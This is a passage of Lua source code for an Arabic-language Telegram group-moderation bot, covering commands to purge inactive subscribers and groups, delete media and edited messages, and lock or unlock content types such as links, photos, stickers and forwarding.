if data.ID and data.ID == "Ok"  then
else
DevFeras:srem(DevFeras.."bot:userss",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*لا يوجد مشتركين وهميين* \n ', 1, 'md')
else
local ok = #pv - sendok
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙عدد المشتركين الان ↫ { '..#pv..' }\n⌁︙تم حذف ↫ { '..sendok..' } من المشتركين\n⌁︙العدد الحقيقي الان  ↫ ( '..ok..' ) \n', 1, 'md')
end
end
end,nil)
end,nil)
end
return false
end
--     Source DevFeras     --
if text == "تنظيف القروبات" and Sudo(msg) and ChCheck(msg) or text == "تنظيف المجموعات" and Sudo(msg) and ChCheck(msg) then 
local group = DevFeras:smembers(DevFeras.."bot:groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevFeras:srem(DevFeras.."bot:groups",group[i]) 
changeChatMemberStatus(group[i], bot_id, "Left")
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevFeras:srem(DevFeras.."bot:groups",group[i]) 
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevFeras:srem(DevFeras.."bot:groups",group[i]) 
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
DevFeras:srem(DevFeras.."bot:groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙*لاتوجد مجموعات وهميه* \n ', 1, 'md')   
else
local DevFerasgp2 = (w + q)
local DevFerasgp3 = #group - DevFerasgp2
if q == 0 then
DevFerasgp2 = ''
else
DevFerasgp2 = '\n⌁︙تم حذف ↫ { '..q..' } مجموعه من البوت'
end
if w == 0 then
DevFerasgp1 = ''
else
DevFerasgp1 = '\n⌁︙تم حذف ↫ { '..w..' } مجموعه بسبب تنزيل البوت الى عضو'
end
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙عدد القروبات الان ↫ { '..#group..' }'..DevFerasgp1..''..DevFerasgp2..'\n⌁︙العدد الحقيقي الان  ↫ ( '..DevFerasgp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
end 
end
--     Source DevFeras     --
if text == "تفعيل امسح" and MonshId(msg.sender_user_id_, msg.chat_id_) and SourceCh(msg) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل امسح بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:Del:Abs'..msg.chat_id_,true)  
end
if text == "تعطيل امسح" and MonshId(msg.sender_user_id_, msg.chat_id_) and SourceCh(msg) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل امسح بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:Del:Abs'..msg.chat_id_) 
end
if Cleaner(msg.sender_user_id_, msg.chat_id_) then
if text == "الميديا" and SourceCh(msg) and DevFeras:get(DevFeras..'bot:Del:Abs'..msg.chat_id_) then 
local M = DevFeras:scard(DevFeras.."abs:cleaner"..msg.chat_id_)
if M ~= 0 then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙عدد الميديا ↫ "..M, 1, 'md') 
else
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد ميديا هنا", 1, 'md') 
end end
if DevFeras:get(DevFeras..'bot:Del:Abs'..msg.chat_id_) then 
if text == "امسح" and SourceCh(msg) or text == "تنظيف ميديا" and SourceCh(msg) or text == "تنظيف الميديا" and SourceCh(msg) then
local list = DevFeras:smembers(DevFeras.."abs:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(list) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
if Del ~= 0 then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف "..Del.." من الميديا", 1, 'md') 
DevFeras:del(DevFeras.."abs:cleaner"..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد ميديا هنا", 1, 'md') 
end end end
end
--     Source DevFeras     --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text == "تنظيف تعديل" or text == "تنظيف التعديل" and ChCheck(msg) then   
Abs_Del = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
Abs_Del[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Abs_Del},function(arg,data)
new = 0
Abs_Del2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
Abs_Del2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,Abs_Del2)
end,nil)  
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم تنظيف 100 من الرسائل المعدله', 1, 'md')
end
--     Source DevFeras     --
if text and text:match("^تنظيف الرسائل$") and Sudo(msg) then
local allmgs = DevFeras:get(DevFeras.."bot:allmsgs")
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم تنظيف '..allmgs..' من رسائل القروبات', 'md')
DevFeras:del(DevFeras.."bot:allmsgs")
end
--     Source DevFeras     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^فتح (.*)$") and ChCheck(msg) then
local unlockpts = {string.match(text, "^(فتح) (.*)$")}
if unlockpts[2] == "التعديل" then
if DevFeras:get(DevFeras..'editmsg'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح التعديل بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'editmsg'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙التعديل بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "التعديل الميديا" or unlockpts[2] == "تعديل الميديا" then
if DevFeras:get(DevFeras..'editmsg'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح تعديل الميديا\n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'editmsg'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تعديل الميديا بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "الفارسيه" then
if DevFeras:get(DevFeras..'farsi'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الفارسيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'farsi'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "الفشار" then
if not DevFeras:get(DevFeras..'fshar'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الفشار بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'fshar'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الفشار بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "الطائفيه" then
if not DevFeras:get(DevFeras..'taf'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الطائفيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'taf'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الطائفيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "الكفر" then
if not DevFeras:get(DevFeras..'kaf'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الكفر بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'kaf'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الكفر بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "الفارسيه بالطرد" then
if DevFeras:get(DevFeras..'farsiban'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الفارسيه بالطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'farsiban'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالطرد بالفعل مفتوحه', 1, 'md')
end
end
if unlockpts[2] == "البوتات" then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح البوتات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras.."abs:Lock:Bots"..msg.chat_id_)  
end
if unlockpts[2] == "البوتات بالطرد" then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح البوتات بالطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras.."abs:Lock:Bots"..msg.chat_id_)  
end
if unlockpts[2] == "البوتات بالتقييد" then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح البوتات بالتقييد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras.."abs:Lock:Bots"..msg.chat_id_)  
end
if unlockpts[2] == "التكرار" then 
DevFeras:hdel(DevFeras.."abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح التكرار بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
if Monsh(msg.sender_user_id_, msg.chat_id_) then
if unlockpts[2] == "التثبيت" then
if DevFeras:get(DevFeras..'bot:pin:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح التثبيت بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:pin:mute'..msg.chat_id_)
DevFeras:srem(DevFeras.."bot:pin:mutepin",msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙التثبيت بالفعل مفتوح في المجموعه', 1, 'md')
end end end
end
end
--     Source DevFeras     --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^قفل (.*)$") and ChCheck(msg) then
local mutepts = {string.match(text, "^(قفل) (.*)$")}
if mutepts[2] == "الدردشه" then
if not DevFeras:get(DevFeras..'bot:text:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الدردشه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:text:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الدردشه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الاونلاين" then
if not DevFeras:get(DevFeras..'bot:inline:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الاونلاين بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:inline:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الاونلاين بالفعل مقفل في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الصور" then
if not DevFeras:get(DevFeras..'bot:photo:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الصور بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:photo:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الصور بالفعل مقفله في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الكلايش" then
if not DevFeras:get(DevFeras..'bot:spam:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الكلايش بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:spam:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الكلايش بالفعل مقفله في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الدخول" then
if not DevFeras:get(DevFeras..'bot:Join:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الدخول بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:Join:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الدخول بالفعل مقفل في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الفيديو" then
if not DevFeras:get(DevFeras..'bot:video:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الفيديو بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:video:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الفيديو بالفعل مقفل في المجموعه', 1, 'md')
end
end
if mutepts[2] == "المتحركه" then
if not DevFeras:get(DevFeras..'bot:gifs:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل المتحركه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:gifs:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙المتحركه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الاغاني" then
if not DevFeras:get(DevFeras..'bot:music:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الاغاني بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:music:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الاغاني بالفعل مقفله في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الصوت" then
if not DevFeras:get(DevFeras..'bot:voice:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الصوت بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:voice:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الصوت بالفعل مقفل في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الروابط" then
if not DevFeras:get(DevFeras..'bot:links:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الروابط بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:links:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الروابط بالفعل مقفله في المجموعه', 1, 'md')
end
end
if mutepts[2] == "المواقع" then
if not DevFeras:get(DevFeras..'bot:location:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل المواقع بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:location:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙المواقع بالفعل مقفله في المجموعه', 1, 'md')
end
end
if mutepts[2] == "المعرف" then
if not DevFeras:get(DevFeras..'tags:lock'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل المعرف بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'tags:lock'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙المعرف بالفعل مقفل في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الملفات" then
if not DevFeras:get(DevFeras..'bot:document:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الملفات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:document:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الملفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الهاشتاك" then
if not DevFeras:get(DevFeras..'bot:abstag:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الهاشتاك بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:abstag:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الهاشتاك بالفعل مقفل في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الجهات" then
if not DevFeras:get(DevFeras..'bot:contact:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الجهات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:contact:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '️⌁︙الجهات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الشبكات" then
if not DevFeras:get(DevFeras..'bot:webpage:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الشبكات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:webpage:mute'..msg.chat_id_,true) 
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الشبكات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if mutepts[2] == "العربيه" then
if not DevFeras:get(DevFeras..'bot:arabic:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل العربيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:arabic:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العربيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الانجليزيه" then
if not DevFeras:get(DevFeras..'bot:english:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الانجليزيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:english:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الانجليزيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الملصقات" then
if not DevFeras:get(DevFeras..'bot:sticker:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الملصقات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:sticker:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الملصقات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الماركداون" then
if not DevFeras:get(DevFeras..'markdown:lock'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الماركداون بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'markdown:lock'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الماركداون بالفعل مقفل في المجموعه', 1, 'md')
end
end
if mutepts[2] == "الاشعارات" then
if not DevFeras:get(DevFeras..'bot:tgservice:jk'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الاشعارات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:tgservice:jk'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الاشعارات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if mutepts[2] == "التوجيه" then
if not DevFeras:get(DevFeras..'bot:forward:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل التوجيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:forward:mute'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙التوجيه بالفعل مقفل في المجموعه', 1, 'md')
end
end
end
end
--     Source DevFeras     --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^فتح (.*)$") and ChCheck(msg) then
local unmutepts = {string.match(text, "^(فتح) (.*)$")}
if unmutepts[2] == "الدردشه" then
if DevFeras:get(DevFeras..'bot:text:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الدردشه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:text:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الدردشه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الصور" then
if DevFeras:get(DevFeras..'bot:photo:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الصور بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:photo:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الكلايش" then
if DevFeras:get(DevFeras..'bot:spam:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الكلايش بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:spam:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الكلايش بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الدخول" then
if DevFeras:get(DevFeras..'bot:Join:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الدخول بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:Join:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الدخول بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الفيديو" then
if DevFeras:get(DevFeras..'bot:video:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الفيديو بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:video:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الفيديو بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الملفات" then
if DevFeras:get(DevFeras..'bot:document:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الملفات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:document:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الملفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الاونلاين" then
if DevFeras:get(DevFeras..'bot:inline:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الاونلاين بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:inline:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الاونلاين بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الماركداون" then
if DevFeras:get(DevFeras..'markdown:lock'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الماركداون بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'markdown:lock'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الماركداون بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "المتحركه" then
if DevFeras:get(DevFeras..'bot:gifs:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح المتحركه بنجاح \n ✓'
